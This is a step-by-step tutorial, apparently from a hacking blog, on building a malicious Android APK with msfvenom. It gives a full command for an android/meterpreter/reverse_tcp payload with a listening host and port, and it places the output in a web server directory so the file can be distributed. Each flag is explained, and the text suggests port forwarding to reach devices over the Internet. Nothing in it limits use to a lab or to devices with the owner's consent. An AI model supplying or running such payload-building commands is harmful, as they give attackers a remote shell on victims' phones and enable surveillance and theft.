### Step by step Tutorial

#### Step 1 : Generating a Payload with msfvenom
At first, fire up the Kali Linux so that we may generate an apk file as a malicious payload. 
We need to check our local IP that turns out to be ‘192.xxx.x.xxx’. 
You can also hack an Android device through Internet by using your Public/External IP in the LHOST and by port forwarding.



After getting your Local host IP use msfvenom tool that will generate a payload to penetrate the Android device. 

Type command: **msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444 R> /var/www/html/ehacking.apk**

Where:
-p indicates a payload type
android/metepreter/reverse_tcp specifies a reverse meterpreter shell would come in from a target Android device
LHOST is your local IP
LPORT is set to be as a listening port
R> /var/www/html would give the output directly on apache server
apk is the final name of the final output

This would take some time to generate an apk file of almost ten thousand bytes.
